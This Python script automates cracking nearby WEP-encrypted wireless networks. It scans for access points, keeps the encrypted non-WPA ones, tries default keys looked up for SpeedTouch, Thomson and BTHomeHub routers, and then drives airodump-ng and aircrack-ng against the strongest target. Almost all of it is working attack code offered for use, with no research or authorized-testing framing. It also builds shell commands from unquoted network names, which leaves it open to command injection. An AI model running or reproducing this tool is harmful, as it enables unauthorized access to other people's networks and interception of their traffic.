#!/usr/bin/env python

"""
A script to automate cracking a WEP encrypted wireless network.
"""

# TODO: os.tempnam() or tmpfile() or tmpnam()
# TODO: import subprocess (and use it instead of os.popen / os.system etc)

import logging, os

logging.basicConfig(level=logging.DEBUG)
logging.info("WEP-crack starting")

cmd_redirect = "1>/dev/null 2>/dev/null"

def check_permissions():
	import sys

	if ( os.geteuid() != 0 ):
		logging.info("User is not root, will restart as root")
		if ( sys.argv[0] ):
			try:
				os.execv( "/usr/bin/sudo", [ "-S", sys.argv[0] ] )
			except:
				logging.error("Cannot restart script as root")
				raise
			exit(1)
	else:
		logging.info("User is root, good")


def configure_interface():
	"""
	Enable the rtap0 interface extension of a _patched_ ipw2200 interface
	"""

	import os

	if ( os.system("ifconfig rtap0 %s" % cmd_redirect ) == 0 ):
		logging.info("rtap0 interface available, good")
	else:
		logging.info("rtap0 interface not available")
		# Need to reconfigure the ipw2200 module
		if ( os.system("lsmod | grep ^ipw2200 %s" % cmd_redirect ) != 0 ):
			logging.warn("ipw2200 was not already loaded")
		else:
			logging.info("ipw2200 was loaded, unloading now")
			if ( os.system("rmmod ipw2200 %s" % cmd_redirect) != 0 ):
				logging.error("Unable to remove ipw2200")
				exit(1)

		if ( os.system("modprobe ipw2200 rtap_iface=1 %s" % cmd_redirect) != 0 ):
			logging.error("Unable to (re)load ipw2200 module with the rtap0 interface enabled.\nPerhaps your ipw2200 module has not been patched?")
			exit(1)
		else:
			logging.info("Reloaded ipw2200 with rtap0 interface")


		if ( os.system("ifconfig rtap0 %s" % cmd_redirect) != 0 ):
			logging.error("rtap0 interface still not available after module reload, quitting!")
			exit(1)

	if( os.system("ifconfig rtap0 up") != 0 ):
		logging.error("Unable to bring-up rtap0, quitting")
		exit(1)

	if( os.system("ifconfig eth1 up") != 0 ):
		logging.error("Unable to bring-up eth1, quitting")
		exit(1)

	if( os.system("iwconfig eth1 mode managed channel 0 essid any") != 0 ):
		logging.error("Unable to set interface mode to unassociated")
		exit(1)

	import time
	p = os.popen("iwlist eth1 scan")
	p.read()	# Discard output
	p.close()
	logging.info("Waiting for network list to be populated")
	time.sleep(3)

def get_list_of_networks():
	"""
	Obtains a list of networks in range, and their details
	"""

	import re, logging
	logging = logging.getLogger("iwlist_parser")

	start_of_cell = re.compile("^\s*Cell \d+ .*Address: (.*)$")

	# List of tuples. e.g.
	# [ ("BSSID", pattern_obj1), ("channel", pattern_obj2), ...]
	parse_rules = []
	parse_rules.append( dict(
		keyname = "BSSID",
		pattern = re.compile("^\s*Cell \d+ .*Address: (.*)$")
		))
	parse_rules.append( dict(
		keyname = "ESSID",
		pattern = re.compile('^\s+ESSID:"(.*)"$')
		))
	parse_rules.append( dict(
		keyname = "mode",
		pattern = re.compile('^\s+Mode:(.*)$')
		))
	parse_rules.append( dict(
		keyname = "channel",
		pattern = re.compile('^.*\(Channel (\d+)\)$')
		))
	parse_rules.append( dict(
		keyname = "encryption",
		pattern = re.compile('^.*Encryption key:(.*)$')
		))
	parse_rules.append( dict(
		keyname = "signal",
		pattern = re.compile('^.*Signal level=([-0-9]+) ')
		))
	parse_rules.append( dict(
		keyname = "WPAenc",
		pattern = re.compile('^.*IE: WPA Version (\d+)')
		))

	p = os.popen("iwlist eth1 scan")
	c = p.readlines()
	p.close()

	n = []		# List of network dictionaries
	d = None	# Dictionary for current cell
	for l in c:
		if( re.match(start_of_cell, l) ):
			d = dict()	# Create new dictionary
			n.append( d )

		for r in parse_rules:
			m = re.match( r["pattern"], l )
			if m:
				#logging.debug("%s" % r["keyname"])
				d[ r["keyname"] ] = m.groups()[0]

	logging.info("%d networks in range" % len(n))
	
	# Remove ad-hoc networks
	before =  len(n)
	n = filter( lambda x: x["mode"] == "Master", n )
	after = len(n)
	logging.info("%d non-access-point networks removed from list", (before - after) )

	# Remove unencrypted networks
	before = len(n)
	n = filter( lambda x: x["encryption"] == "on", n )
	after = len(n)
	logging.info("%d non-encrypted networks removed from list", (before - after) )

	# Remove WPA-encrypted networks
	before =  len(n)
	n = filter( lambda x: "WPAenc" not in x, n )
	after = len(n)
	logging.info("%d WPA-encrypted networks removed from list", (before - after) )

	# Sort by signal strength (best first)
	n.sort( lambda x, y: cmp(x["signal"], y["signal"]) )

	print "Candidate networks, ordered by signal strength:"
	for x in n:
		print "%s\t%s" % (x["signal"], x["ESSID"])

	print
	
	return n

def fetch_network_keys(network):
	"""
	Looks up the network SSID's hex-portion in a database of WEP keys.
	SpeedTouch, Thompson and BTHomeHub are vulnerable to this attack.
	"""
	import subprocess
	p = subprocess.Popen("./search-keys.py %(ESSID)s" % network, stdout=subprocess.PIPE, shell=True)
	keys = p.stdout.readlines()
	keys = [ x.strip() for x in keys ] # Remove newlines
	return keys

def check_connection():
	"""
	Returns True if the current network settings permit access to the network,
	False otherwise

	Connectivity is tested by attempting to acquire a DHCP lease
	"""
	import subprocess

	retcode = subprocess.call("dhclient -1 eth1", shell=True)
	if retcode == 0:
		return True
	else:
		return False

def crack_network(network):
	"""
	Given a dictionary object describing the network, attempts to crack it
	"""
	import time, glob, sys

	print "Attempting to crack:"
	for k in ["ESSID", "BSSID", "channel", "signal"]:
		print "%14s: %s" % (k, network[k])

	print

	print "Checking if DB contains any WEP keys for this network..."
	keys = fetch_network_keys(network)
	if len(keys) > 0:
		print "Found %d likely keys." % len(keys)
		for key in keys:
			attach_to_network(network, key)
			if check_connection():
				print
				print "Found key! Key is (hex):", key
				print "Leaving network in configured state and quitting"
				sys.exit()
	
	print
	print "Attempting injection attack"
	attach_to_network(network, "s:fakekey")

	airodump = CapturePackets(network)
	airodump.start()

	while airodump.status["s"] == 0:
		time.sleep(1.0)
	logging.debug("Packets: %s" % airodump.status["s"])

	while True:
		time.sleep(1.0)
		filelist = glob.glob("%s-*.ivs" % network["ESSID"])
		if len( filelist ) > 0:
			break

	aircrack = CrackPackets(network)
	aircrack.start()

	while aircrack.isAlive():
		time.sleep(1.0)
		logging.info("Captured %s packets" % airodump.status.__repr__())
	logging.info("Cracker died")
	print aircrack.screen

	aircrack.join()
	airodump.exit()

def attach_to_network(network, key):
	"""
	Given a network dictionary and an encryption key string, configures the
	wireless interface to connect to the network
	"""

	import time

	# NB: This is a function-local modification, it's just convenient for
	# print()
	network["key"] = key

	os.system("iwconfig eth1 essid %(ESSID)s mode Managed channel %(channel)s "
			"key %(key)s ap %(BSSID)s" % network)

	# Now wait for the interface to confirm it is no longer "unassociated"
	retries = 10
	while retries:
		retries -= 1
		time.sleep(1)
		if( os.system("iwconfig eth1 | head -n1 | grep 'IEEE 802.11' %s" % cmd_redirect) == 0 ):
			# Success!
			logging.info("Associated with network using key '%s'" % network["key"])
			return
		else:
			logging.info("%d Waiting for interface to associate with network" % retries)
	
	logging.error("Failed to connect to network!")
	raise Exception("unassociated")


from threading import Thread
class CapturePackets(Thread):

	network		= None
	logging		= None
	lock		= None
	subprocess	= None
	status		= None

	def __init__(self, network):
		import thread

		Thread.__init__(self)
		self.network = network
		self.logging = logging.getLogger("CapturePackets")
		self.lock = thread.allocate_lock()

		self.status = dict()
		self.status["BSSID"] = "00:00:00:00:00:00"
		self.status["PWR"] = "0"
		self.status["RXQ"] = "0"
		self.status["Beacons"] = "0"
		self.status["Data"] = "0"
		self.status["s"] = "0"
		self.status["CH"] = "0"
		self.status["MB"] = "0"

	def parseScreen(self, screen):
		"""
		Analyses a (text) screen-shot and update status dictionary
		"""
		import re

		pat_mac = "((?:[0-9A-Z]{2}:?){6})"
		pat_num = "\s+(\d+)"
		m = re.findall(
				"\s+%s%s%s%s%s%s%s%s" % (
						pat_mac,	# BSSID
						pat_num,	# PWR
						pat_num,	# RXQ
						pat_num,	# Beacons
						pat_num,	# #Data
						pat_num,	# #/s
						pat_num,	# CH
						pat_num		# MB
				),
				screen,
				re.MULTILINE
			)
		if m:
			(
				self.status["BSSID"],
				self.status["PWR"],
				self.status["RXQ"],
				self.status["Beacons"],
				self.status["Data"],
				self.status["s"],
				self.status["CH"],
				self.status["MB"]
			) = m[0]

	def run(self):
		import subprocess
		cmdline = [
				"airodump-ng",
				"--ivs",
				"--write", "%(ESSID)s" % self.network,
				"--bssid", "%(BSSID)s" % self.network,
				"--channel", "%(channel)s" % self.network,
				"rtap0"
				]
		self.logging.debug("Cmdline: %s" % cmdline)
		self.subprocess = subprocess.Popen(
				cmdline,
				stdin=file("/dev/zero"),
				stderr=subprocess.PIPE, # This is where output is sent by this app: not stdout!
				bufsize=1
			)

		screen = "" # Holds currently rendering screen
		while True:
			line = self.subprocess.stderr.readline()
			# Check for start of new screen
			if len(line) > 0 and line[0] == "\033":
				self.parseScreen(screen)
				screen = ""
			else:
				screen += line

			# Check if the process has died
			if self.subprocess.poll() is not None:
				break

	def exit(self):
		import subprocess, os, signal
		self.logging.info("Signalling child with SIGTERM")
		os.kill(self.subprocess.pid, signal.SIGTERM)
		self.logging.info("Waiting for subprocess to die.")
		r = self.subprocess.wait()
		self.logging.info("Child exited with return code %d" % r)


from threading import Thread
class CrackPackets(Thread):

	network		= None
	logging		= None
	lock		= None
	subprocess	= None
	screen		= None	# Holds last complete screen-shot
	status		= None

	def __init__(self, network):
		import thread

		Thread.__init__(self)
		self.network = network
		self.logging = logging.getLogger("CapturePackets")
		self.lock = thread.allocate_lock()

		self.status = dict()


	def parseScreen(self, screen):
		"""
		Analyses a (text) screen-shot and update status dictionary
		"""
		import re
		# TODO

	def run(self):
		import subprocess, glob
		filelist = glob.glob("%s-*.ivs" % network["ESSID"])
		cmdline = [
				"aircrack-ng"
				]
		cmdline.extend(filelist)
		self.logging.debug("Cmdline: %s" % cmdline)
		self.subprocess = subprocess.Popen(
				cmdline,
				stdin=file("/dev/zero"),
				stdout=subprocess.PIPE,
				bufsize=1
			)

		screen = "" # Holds currently rendering screen
		while True:
			line = self.subprocess.stdout.readline()
			# Check for start of new screen
			if len(line) > 0 and line[0] == "\033":
				self.parseScreen(screen)
				screen = ""
			else:
				screen += line

			# Check if the process has died
			if self.subprocess.poll() is not None:
				break

	def exit(self):
		import subprocess, os, signal
		self.logging.info("Signalling child with SIGTERM")
		os.kill(self.subprocess.pid, signal.SIGTERM)
		self.logging.info("Waiting for subprocess to die.")
		r = self.subprocess.wait()
		self.logging.info("Child exited with return code %d" % r)


check_permissions()
configure_interface()
networks = get_list_of_networks()
for network in networks[0:1]:	# XXX: Remove this slice when done testing
	crack_network(network)
